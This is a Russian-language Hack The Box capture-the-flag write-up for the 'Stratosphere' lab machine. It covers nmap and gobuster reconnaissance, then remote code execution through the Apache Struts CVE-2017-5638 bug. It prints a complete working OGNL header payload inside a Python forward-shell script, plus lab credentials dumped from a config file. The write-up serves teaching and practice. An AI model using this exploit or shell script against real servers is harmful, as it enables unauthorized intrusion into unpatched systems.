---
layout: post
title: "HTB{ Stratosphere }"
date: 2018-09-05 01:00:00 +0300
author: snovvcrash
tags: [hackthebox, xakepru, ctf, write-up, box, Stratosphere, linux apache, apache-struts, forward-shell, FwdSh3ll, python, eval, library-hijacking, john, hashes]
comments: true
published: true
---

[//]: # (2019-09-17)

[![htb-badge.svg](https://img.shields.io/badge/%e2%98%90-hackthebox.eu-8ac53e?style=flat-square)](https://www.hackthebox.eu/home/machines/profile/129 "Hack The Box :: Stratosphere")
[![xakep-badge.svg](https://img.shields.io/badge/%5d%5b-xakep.ru-red?style=flat-square)](https://xakep.ru/2019/08/13/struts-forward-shell/ "Полет в стратосферу. Ломаем Struts через Action-приложение и мастерим Forward Shell - «Хакер»")

**Stratosphere** — уютная Linux-машина, которая встретит нас RCE-уязвимостью фреймворка Apache Struts, помучает невозможностью получения стандартного reverse-shell'а, заставив прибегнуть к концепции forward-shell'а, после чего посредством взаимодействия с СУБД MySQL предложит взглянуть на нарушение политики локального хранения паролей, подразнит реверсом дайджестов различных алгоритмов хеширования, а под зановес угостит практикой абьюзинга функции eval() из-под Python'а или же угоном Python-модулей (aka Python Library Hijacking) на выбор (мы угостимся и тем, и другим though). Несмотря на то, что этот бокс идеально вписывается в описанную ранее концепцию "типичной CTF-машины", найти к ней подход было действительно весело.

<!--cut-->

**5.2/10**
{: style="color: orange; text-align: right;"}

[![banner.png]({{ "/img/htb/boxes/stratosphere/banner.png" | relative_url }})](https://www.hackthebox.eu/home/machines/profile/129 "Hack The Box :: Stratosphere")
{: .center-image}

![info.png]({{ "/img/htb/boxes/stratosphere/info.png" | relative_url }})
{: .center-image}

* TOC
{:toc}

[*Приложения*](https://github.com/snovvcrash/xakepru/tree/master/htb-stratosphere)

# Разведка
## Nmap
Fire up NMAP! Для начала аккуратно:
```text
root@kali:~# nmap -n -vvv -sS -Pn -oA nmap/initial 10.10.10.64
...
```

```text
root@kali:~# cat nmap/initial.nmap
# Nmap 7.70 scan initiated Sun Sep  2 09:08:59 2018 as: nmap -n -vvv -sS -Pn -oA nmap/initial 10.10.10.64
Nmap scan report for 10.10.10.64
Host is up, received user-set (0.061s latency).
Scanned at 2018-09-02 09:08:59 EDT for 9s
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Sep  2 09:09:08 2018 -- 1 IP address (1 host up) scanned in 8.32 seconds
```

Не долго думая, более требовательно:
```text
root@kali:~# nmap -n -vvv -sS -sV -sC -oA nmap/version -p22,80,8080 10.10.10.64
...
```

```text
root@kali:~# cat nmap/.nmap
# Nmap 7.70 scan initiated Sun Sep  2 09:09:21 2018 as: nmap -n -vvv -sS -sV -sC -oA nmap/version -p22,80,8080 10.10.10.64
Nmap scan report for 10.10.10.64
Host is up, received echo-reply ttl 63 (0.061s latency).
Scanned at 2018-09-02 09:09:21 EDT for 20s

PORT     STATE SERVICE    REASON         VERSION
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 5b:16:37:d4:3c:18:04:15:c4:02:01:0d:db:07:ac:2d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/ZrhtS/1LMqpE0pS0DNcrGuHja+fXwbhvUtcoACmwgBz+NiJ8pGWBHjs/efq8RkSOJbtQ93T5iIgYc1a4yak+a4s0RVFPRQ4uIvrDNu1JQZdTQlfKDxYEPcRCk6HvLFd6T/PvFmStD6wyILYZvg4d51343KRoTQ9SP8HCiYtTXT5m23a/zovgA22vrsHpibWh58uZG/T7yjHApPWXBqQVOqXlsRA6t2AGLdeVuecn8WDTCYsetOFoydUacE/U64Im1yJsnjB1M5MN3otB3mUbPdaWCfDTEapVwiF4R6TmEjOSs7YJtJwMTefs1Tjgaa1TaOnBayOd8DD/mNR716AN
|   256 e3:77:7b:2c:23:b0:8d:df:38:35:6c:40:ab:f6:81:50 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDLcuaifdQuvYGsoxs0El6AdcFhGTmXDTF3CuJyaAZDE1r2sH58dgs9fnv3q363E1Xn7ls/iyQpZSs3l4eTY4m0=
|   256 d7:6b:66:9c:19:fc:aa:66:6c:18:7a:cc:b5:87:0e:40 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAU8zoEJ6iVH23kYgyCpFFiWBmXaPuUSkN59VRWyy4Sn
80/tcp   open  http       syn-ack ttl 63
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Sun, 02 Sep 2018 13:09:30 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body>
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"1708-1519762495000"
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Sun, 02 Sep 2018 13:09:29 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8"/>
|     <title>Stratosphere</title>
|     <link rel="stylesheet" type="text/css" href="main.css">
|     </head>
|     <body>
|     <div id="background"></div>
|     <header id="main-header" class="hidden">
|     <div class="container">
|     <div class="content-wrap">
|     <p><i class="fa fa-diamond"></i></p>
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap">
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a>
|     <p><i class="ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Sun, 02 Sep 2018 13:09:29 GMT
|     Connection: close
|   RTSPRequest, X11Probe: 
|     HTTP/1.1 400 
|     Transfer-Encoding: chunked
|     Date: Sun, 02 Sep 2018 13:09:29 GMT
|_    Connection: close
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-title: Stratosphere
8080/tcp open  http-proxy syn-ack ttl 63
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1114
|     Date: Sun, 02 Sep 2018 13:09:29 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body>
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"1708-1519762495000"
|     Last-Modified: Tue, 27 Feb 2018 20:14:55 GMT
|     Content-Type: text/html
|     Content-Length: 1708
|     Date: Sun, 02 Sep 2018 13:09:29 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8"/>
|     <title>Stratosphere</title>
|     <link rel="stylesheet" type="text/css" href="main.css">
|     </head>
|     <body>
|     <div id="background"></div>
|     <header id="main-header" class="hidden">
|     <div class="container">
|     <div class="content-wrap">
|     <p><i class="fa fa-diamond"></i></p>
|     <nav>
|     class="btn" href="GettingStarted.html">Get started</a>
|     </nav>
|     </div>
|     </div>
|     </header>
|     <section id="greeting">
|     <div class="container">
|     <div class="content-wrap">
|     <h1>Stratosphere<br>We protect your credit.</h1>
|     class="btn" href="GettingStarted.html">Get started now</a>
|     <p><i class="ar
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Sun, 02 Sep 2018 13:09:29 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Transfer-Encoding: chunked
|     Date: Sun, 02 Sep 2018 13:09:29 GMT
|_    Connection: close
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Stratosphere
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.70%I=7%D=9/2%Time=5B8BE109%P=x86_64-pc-linux-gnu%r(GetRe
SF:quest,786,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETag:\x20
SF:W/\"1708-1519762495000\"\r\nLast-Modified:\x20Tue,\x2027\x20Feb\x202018
SF:\x2020:14:55\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:\x2
SF:01708\r\nDate:\x20Sun,\x2002\x20Sep\x202018\x2013:09:29\x20GMT\r\nConne
SF:ction:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20\x20
SF:\x20<meta\x20charset=\"utf-8\"/>\n\x20\x20\x20\x20<title>Stratosphere</
SF:title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/css\
SF:"\x20href=\"main\.css\">\n</head>\n\n<body>\n<div\x20id=\"background\">
SF:</div>\n<header\x20id=\"main-header\"\x20class=\"hidden\">\n\x20\x20<di
SF:v\x20class=\"container\">\n\x20\x20\x20\x20<div\x20class=\"content-wrap
SF:\">\n\x20\x20\x20\x20\x20\x20<p><i\x20class=\"fa\x20fa-diamond\"></i></
SF:p>\n\x20\x20\x20\x20\x20\x20<nav>\n\x20\x20\x20\x20\x20\x20\x20\x20<a\x
SF:20class=\"btn\"\x20href=\"GettingStarted\.html\">Get\x20started</a>\n\x
SF:20\x20\x20\x20\x20\x20</nav>\n\x20\x20\x20\x20</div>\n\x20\x20</div>\n<
SF:/header>\n\n<section\x20id=\"greeting\">\n\x20\x20<div\x20class=\"conta
SF:iner\">\n\x20\x20\x20\x20<div\x20class=\"content-wrap\">\n\x20\x20\x20\
SF:x20\x20\x20<h1>Stratosphere<br>We\x20protect\x20your\x20credit\.</h1>\n
SF:\x20\x20\x20\x20\x20\x20<a\x20class=\"btn\"\x20href=\"GettingStarted\.h
SF:tml\">Get\x20started\x20now</a>\n\x20\x20\x20\x20\x20\x20<p><i\x20class
SF:=\"ar")%r(HTTPOptions,8A,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,\x20HEA
SF:D,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS\r\nContent-Length:\x200\r\nDa
SF:te:\x20Sun,\x2002\x20Sep\x202018\x2013:09:29\x20GMT\r\nConnection:\x20c
SF:lose\r\n\r\n")%r(RTSPRequest,6A,"HTTP/1\.1\x20400\x20\r\nTransfer-Encod
SF:ing:\x20chunked\r\nDate:\x20Sun,\x2002\x20Sep\x202018\x2013:09:29\x20GM
SF:T\r\nConnection:\x20close\r\n\r\n0\r\n\r\n")%r(X11Probe,6A,"HTTP/1\.1\x
SF:20400\x20\r\nTransfer-Encoding:\x20chunked\r\nDate:\x20Sun,\x2002\x20Se
SF:p\x202018\x2013:09:29\x20GMT\r\nConnection:\x20close\r\n\r\n0\r\n\r\n")
SF:%r(FourOhFourRequest,4F6,"HTTP/1\.1\x20404\x20\r\nContent-Type:\x20text
SF:/html;charset=utf-8\r\nContent-Language:\x20en\r\nContent-Length:\x2011
SF:14\r\nDate:\x20Sun,\x2002\x20Sep\x202018\x2013:09:30\x20GMT\r\nConnecti
SF:on:\x20close\r\n\r\n<!doctype\x20html><html\x20lang=\"en\"><head><title
SF:>HTTP\x20Status\x20404\x20\xe2\x80\x93\x20Not\x20Found</title><style\x2
SF:0type=\"text/css\">h1\x20{font-family:Tahoma,Arial,sans-serif;color:whi
SF:te;background-color:#525D76;font-size:22px;}\x20h2\x20{font-family:Taho
SF:ma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px
SF:;}\x20h3\x20{font-family:Tahoma,Arial,sans-serif;color:white;background
SF:-color:#525D76;font-size:14px;}\x20body\x20{font-family:Tahoma,Arial,sa
SF:ns-serif;color:black;background-color:white;}\x20b\x20{font-family:Taho
SF:ma,Arial,sans-serif;color:white;background-color:#525D76;}\x20p\x20{fon
SF:t-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size
SF::12px;}\x20a\x20{color:black;}\x20a\.name\x20{color:black;}\x20\.line\x
SF:20{height:1px;background-color:#525D76;border:none;}</style></head><bod
SF:y>");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.70%I=7%D=9/2%Time=5B8BE109%P=x86_64-pc-linux-gnu%r(Get
SF:Request,786,"HTTP/1\.1\x20200\x20\r\nAccept-Ranges:\x20bytes\r\nETag:\x
SF:20W/\"1708-1519762495000\"\r\nLast-Modified:\x20Tue,\x2027\x20Feb\x2020
SF:18\x2020:14:55\x20GMT\r\nContent-Type:\x20text/html\r\nContent-Length:\
SF:x201708\r\nDate:\x20Sun,\x2002\x20Sep\x202018\x2013:09:29\x20GMT\r\nCon
SF:nection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n\x20\x20\x
SF:20\x20<meta\x20charset=\"utf-8\"/>\n\x20\x20\x20\x20<title>Stratosphere
SF:</title>\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/cs
SF:s\"\x20href=\"main\.css\">\n</head>\n\n<body>\n<div\x20id=\"background\
SF:"></div>\n<header\x20id=\"main-header\"\x20class=\"hidden\">\n\x20\x20<
SF:div\x20class=\"container\">\n\x20\x20\x20\x20<div\x20class=\"content-wr
SF:ap\">\n\x20\x20\x20\x20\x20\x20<p><i\x20class=\"fa\x20fa-diamond\"></i>
SF:</p>\n\x20\x20\x20\x20\x20\x20<nav>\n\x20\x20\x20\x20\x20\x20\x20\x20<a
SF:\x20class=\"btn\"\x20href=\"GettingStarted\.html\">Get\x20started</a>\n
SF:\x20\x20\x20\x20\x20\x20</nav>\n\x20\x20\x20\x20</div>\n\x20\x20</div>\
SF:n</header>\n\n<section\x20id=\"greeting\">\n\x20\x20<div\x20class=\"con
SF:tainer\">\n\x20\x20\x20\x20<div\x20class=\"content-wrap\">\n\x20\x20\x2
SF:0\x20\x20\x20<h1>Stratosphere<br>We\x20protect\x20your\x20credit\.</h1>
SF:\n\x20\x20\x20\x20\x20\x20<a\x20class=\"btn\"\x20href=\"GettingStarted\
SF:.html\">Get\x20started\x20now</a>\n\x20\x20\x20\x20\x20\x20<p><i\x20cla
SF:ss=\"ar")%r(HTTPOptions,8A,"HTTP/1\.1\x20200\x20\r\nAllow:\x20GET,\x20H
SF:EAD,\x20POST,\x20PUT,\x20DELETE,\x20OPTIONS\r\nContent-Length:\x200\r\n
SF:Date:\x20Sun,\x2002\x20Sep\x202018\x2013:09:29\x20GMT\r\nConnection:\x2
SF:0close\r\n\r\n")%r(RTSPRequest,6A,"HTTP/1\.1\x20400\x20\r\nTransfer-Enc
SF:oding:\x20chunked\r\nDate:\x20Sun,\x2002\x20Sep\x202018\x2013:09:29\x20
SF:GMT\r\nConnection:\x20close\r\n\r\n0\r\n\r\n")%r(FourOhFourRequest,4F6,
SF:"HTTP/1\.1\x20404\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nCo
SF:ntent-Language:\x20en\r\nContent-Length:\x201114\r\nDate:\x20Sun,\x2002
SF:\x20Sep\x202018\x2013:09:29\x20GMT\r\nConnection:\x20close\r\n\r\n<!doc
SF:type\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20404\x2
SF:0\xe2\x80\x93\x20Not\x20Found</title><style\x20type=\"text/css\">h1\x20
SF:{font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D
SF:76;font-size:22px;}\x20h2\x20{font-family:Tahoma,Arial,sans-serif;color
SF::white;background-color:#525D76;font-size:16px;}\x20h3\x20{font-family:
SF:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:
SF:14px;}\x20body\x20{font-family:Tahoma,Arial,sans-serif;color:black;back
SF:ground-color:white;}\x20b\x20{font-family:Tahoma,Arial,sans-serif;color
SF::white;background-color:#525D76;}\x20p\x20{font-family:Tahoma,Arial,san
SF:s-serif;background:white;color:black;font-size:12px;}\x20a\x20{color:bl
SF:ack;}\x20a\.name\x20{color:black;}\x20\.line\x20{height:1px;background-
SF:color:#525D76;border:none;}</style></head><body>");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Sep  2 09:09:41 2018 -- 1 IP address (1 host up) scanned in 20.24 seconds
```

SSH, web-сервис на 80-м, прокся на 8080-м, и два отпечатка неопознанных приложений. Исследуем 80-й порт.

# Web — Порт 80
## Браузер
На `http://10.10.10.64` нас встречает цветастый градиент сайта Stratoshere:

[![port80-browser-1.png]({{ "/img/htb/boxes/stratosphere/port80-browser-1.png" | relative_url }})]({{ "/img/htb/boxes/stratosphere/port80-browser-1.png" | relative_url }})
{: .center-image}

При переходе по "GET STARTED NOW" сервер выплюнет страницу, с таким наполнением:
```html
<!-- view-source:http://10.10.10.64/GettingStarted.html -->

<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8"/>
    <title>Stratosphere -- Getting Started</title>
</head>
<body>
    <h1>Site under construction. Please check back later.</h1>
</body>
</html>
```

Пока пусто. Придерживаясь классической recon-тактики, следующим шагом станет сканирование сервака на известные директории.

## gobuster
Неважно, что ты выберешь — многопоточные `dirbuster` и `gobuster` или минималистичный `dirb` — все они по-своему хороши, я люблю чередовать :grin:

Сегодня воспользуемся gobuster'ом:
```text
root@kali:~# gobuster -u 'http://10.10.10.64' -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e -o gobuster/stratosphere.gobuster
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.64/
[+] Threads      : 10
[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2018/09/03 12:01:56 Starting gobuster
=====================================================
http://10.10.10.64/manager (Status: 302)
http://10.10.10.64/Monitoring (Status: 302)
^C
```

Что имеем: стандартный сервер-менеджер для Apache Tomcat (к которому у нас конечно же нет доступа):

[![port80-browser-2.png]({{ "/img/htb/boxes/stratosphere/port80-browser-2.png" | relative_url }})]({{ "/img/htb/boxes/stratosphere/port80-browser-2.png" | relative_url }})
{: .center-image}

И кое-что way more insteresting:

[![port80-browser-3.png]({{ "/img/htb/boxes/stratosphere/port80-browser-3.png" | relative_url }})]({{ "/img/htb/boxes/stratosphere/port80-browser-3.png" | relative_url }})
{: .center-image}

Есть еще две кнопки — "SIGN ON" и "REGISTER" — но от них толку мало.

"SIGN ON":

[![port80-browser-4.png]({{ "/img/htb/boxes/stratosphere/port80-browser-4.png" | relative_url }})]({{ "/img/htb/boxes/stratosphere/port80-browser-4.png" | relative_url }})
{: .center-image}

"REGISTER":

[![port80-browser-5.png]({{ "/img/htb/boxes/stratosphere/port80-browser-5.png" | relative_url }})]({{ "/img/htb/boxes/stratosphere/port80-browser-5.png" | relative_url }})
{: .center-image}

При попытки ввода чего-либо в поля формы логина сервер отреагирует таким же сообщением, которое он возвращает при запросе формы регистрации.

## Apache Struts
Главная зацепка — action-приложение, увиденное на веб-странице двумя скриншотами ранее. Расширение `.action` недвусмысленно намекает на использование MVC-фреймворка веб-приложений *Apache Struts*, Гугл кричит об этом с первой же ссылки (да и название машины намекает xD).

Позаимствовал [отсюда](https://netbeans.org/kb/docs/web/quickstart-webapps-struts.html "Introduction to the Struts Web Framework - NetBeans IDE Tutorial") картинку, демонстрирующую круговорот ~~веществ~~ трафика в природе Apache Struts:

[![workflow.png](https://netbeans.org/images_www/articles/72/web/struts/workflow.png)](https://netbeans.org/images_www/articles/72/web/struts/workflow.png)
{: .center-image}

Фреймворк известен наличием обилия уязвимостей, в том числе, позволяющих удаленное выполнение кода. Посмотрим, что предложит `searchsploit` для подтвреждения возможности эксплуатации.

## Proof-of-Concept
```
root@kali:~# searchsploit struts remote .py
------------------------------------------------------------------------------------------ ----------------------------------------
 Exploit Title                                                                            |  Path                                 
                                                                                          | (/usr/share/exploitdb/)               
-----------------------------------------------------------------------------------------------------------------------------------
Apache Struts - REST Plugin With Dynamic Method Invocation Remote Code Execution          | exploits/multiple/remote/43382.py
Apache Struts 2.0.1 < 2.3.33 / 2.5 < 2.5.10 - Arbitrary Code Execution                    | exploits/multiple/remote/44556.py
Apache Struts 2.3 < 2.3.34 /  2.5 < 2.5.16 - Remote Code Execution (1)                    | exploits/linux/remote/45260.py
Apache Struts 2.3 < 2.3.34 /  2.5 < 2.5.16 - Remote Code Execution (2)                    | exploits/multiple/remote/45262.py
Apache Struts 2.3.5 < 2.3.31 / 2.5 < 2.5.10 - Remote Code Execution                       | exploits/linux/webapps/41570.py
Apache Struts 2.3.x Showcase - Remote Code Execution                                      | exploits/multiple/webapps/42324.py
Apache Struts 2.5 < 2.5.12 - REST Plugin XStream Remote Code Execution                    | exploits/linux/remote/42627.py
-----------------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Result
```

Похоже, `exploits/linux/webapps/41570.py` — именно то, что нам нужно. Этот скрипт представляет PoC уязвимости [CVE-2017-5638](https://nvd.nist.gov/vuln/detail/CVE-2017-5638 "NVD - CVE-2017-5638"), имеющей максимальный рейтинг опасности (10.0) и заключающейся в некорректной обработке исключений, вследствие которой аттакующий получает возможность выполнения произвольных команд на сервере.

Что ж, попробуем эксплоит в действии:
```text
root@kali:~# python /usr/share/exploitdb/exploits/linux/webapps/41570.py http://10.10.10.64/Monitoring/example/Welcome.action id
[*] CVE: 2017-5638 - Apache Struts2 S2-045
[*] cmd: id

uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)
```

И-и-и у нас есть RCE. Забегая вперед, должен сказать, что повысить привилегии до пользователя в рамках данного бокса можно было просто выполняя команды таким способом, без получения полноценного reverse-shell'а (который, как выяснилось, получить было невозможно в силу жесткой фильтрации http-трафика, возможно файервол). Однако, мы не ищем легких путей, к тому же это отличная возможность попробовать в действии один из способов сборки *forward-shell*'a.

## Forward-Shell
Основная идея такого способа получения командной строки заключается в создании на машине жертвы именованного канала (`stdin`) с помощью `mkfifo` и выходного файла (`stdout`), куда будет записываться вывод команд. После чего к `stdin` с помощью утилиты `tail` привязывается процесс `/bin/sh`, вывод которого перенаправляется в `stdout`. Флаг `-f` утилиты `tail` обеспечивает сохранение процесса выполнения команд даже при достижении конца файла входного канала (когда команды не поступают). В представленном ниже скрипте используется именно такая логика, плюс на фоне поднимается параллельный поток, который с некоторым интервалом опрашивает `stdout` и возвращает его содержимое — результат выполнения последней команды:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Usage: python3 StratosphereFwdShell.py

import urllib.request as urllib2
import http.client as httplib
# _import socket

import base64
import random
import threading
import time


class Stratosphere:

	URL = r'http://10.10.10.64/Monitoring/example/Welcome.action'

	def __init__(self, interval=1.3):
		self.url = Stratosphere.URL

		session = random.randrange(10000, 99999)
		self.stdin = f'/dev/shm/input.{session}'
		self.stdout = f'/dev/shm/output.{session}'
		print(f'[*] Session ID: {session}')

		# Setting up shell
		print('[*] Setting up forward shell on target')
		createNamedPipes = f'mkfifo {self.stdin}; tail -f {self.stdin} | /bin/sh > {self.stdout} 2>&1'
		self.runRawCmd(createNamedPipes, timeout=0.5)

		# Setting up read thread
		print('[*] Setting up read thread')
		self.interval = interval
		thread = threading.Thread(target=self.readThread, args=())
		thread.daemon = True
		thread.start()

	def readThread(self):
		getOutput = f'/bin/cat {self.stdout}'
		while True:
			result = self.runRawCmd(getOutput).decode('utf-8')
			if result:
				print(result)
				clearOutput = f'echo -n "" > {self.stdout}'
				self.runRawCmd(clearOutput)
			time.sleep(self.interval)

	# Source: https://www.exploit-db.com/exploits/41570
	def runRawCmd(self, cmd, timeout=50):
		payload = "%{(#_='multipart/form-data')."
		payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
		payload += "(#_memberAccess?"
		payload += "(#_memberAccess=#dm):"
		payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
		payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
		payload += "(#ognlUtil.getExcludedPackageNames().clear())."
		payload += "(#ognlUtil.getExcludedClasses().clear())."
		payload += "(#context.setMemberAccess(#dm))))."
		payload += "(#cmd='%s')." % cmd
		payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
		payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
		payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
		payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
		payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
		payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
		payload += "(#ros.flush())}"

		headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
		request = urllib2.Request(self.url, headers=headers)

		try:
			return urllib2.urlopen(request, timeout=timeout).read()
		except httplib.IncompleteRead as e:
			return e.partial
		except:  # _socket.timeout:
			pass

	def writeCmd(self, cmd):
		b64Cmd = base64.b64encode(f'{cmd.rstrip()}\n'.encode('utf-8')).decode('utf-8')
		unwrapAndExec = f'base64 -d <<< {b64Cmd} > {self.stdin}'
		self.runRawCmd(unwrapAndExec)
		time.sleep(self.interval * 1.1)

	def upgradeShell(self):
		upgradeShell = """python3 -c 'import pty; pty.spawn("/bin/bash")'"""
		self.writeCmd(upgradeShell)


prompt = 'stratosphere> '
S = Stratosphere()

while True:
	cmd = input(prompt)
	if cmd == 'upgrade':
		prompt = ''
		S.upgradeShell()
	else:
		S.writeCmd(cmd)
```

Подробнее об этом способе можно узнать из [туториала](https://youtu.be/k6ri-LFWEj4?t=15m35s "VulnHub - Sokar - YouTube") прохождения машины с VulnHub'а от IppSec'а. От себя добавлю, что в нашем случае представляется невозможным использование библиотеки `requests` для Python в силу особенностей используемой уязвимости: `requests` не умеет по-человечески работать с возвращаемым уязвимым сервером **IncompleteRead**, возбуждая исключение `requests.exceptions.ChunkedEncodingError`; если же использовать встроенные средства языка, то этот же ответ с IncompleteRead без проблем перехватывается исключением `http.client.IncompleteRead` и далее успешно обрабатывается как `e.partial`. Подробнее об этой проблеме [здесь](https://github.com/mazen160/struts-pwn/issues/8 "Issue with requests partial read · Issue #8 · mazen160/struts-pwn").

Итак, время полевых испытаний:
```text
root@kali:~# python3 StratosphereFwdShell.py
[*] Session ID: 42942
[*] Setting up fifo shell on target
[*] Setting up read thread
stratosphere> pwd
/var/lib/tomcat8

stratosphere> whoami
tomcat8

stratosphere> id
uid=115(tomcat8) gid=119(tomcat8) groups=119(tomcat8)

stratosphere> uname -a
Linux stratosphere 4.9.0-6-amd64 #1 SMP Debian 4.9.82-1+deb9u2 (2018-02-21) x86_64 GNU/Linux

stratosphere> ls -la
total 24
drwxr-xr-x  5 root    root    4096 Sep  4 09:32 .
drwxr-xr-x 42 root    root    4096 Oct  3  2017 ..
lrwxrwxrwx  1 root    root      12 Sep  3  2017 conf -> /etc/tomcat8
-rw-r--r--  1 root    root      68 Oct  2  2017 db_connect
drwxr-xr-x  2 tomcat8 tomcat8 4096 Sep  3  2017 lib
lrwxrwxrwx  1 root    root      17 Sep  3  2017 logs -> ../../log/tomcat8
drwxr-xr-x  2 root    root    4096 Sep  4 09:32 policy
drwxrwxr-x  4 tomcat8 tomcat8 4096 Feb 10  2018 webapps
lrwxrwxrwx  1 root    root      19 Sep  3  2017 work -> ../../cache/tomcat8

stratosphere> file *
conf:       symbolic link to /etc/tomcat8
db_connect: ASCII text
lib:        directory
logs:       symbolic link to ../../log/tomcat8
policy:     directory
webapps:    directory
work:       symbolic link to ../../cache/tomcat8
```

```text
stratosphere> cat db_connect
[ssn]
user=ssn_admin
pass=AWs64@on*&

[users]
user=admin
pass=admin
```

### FwdSh3ll
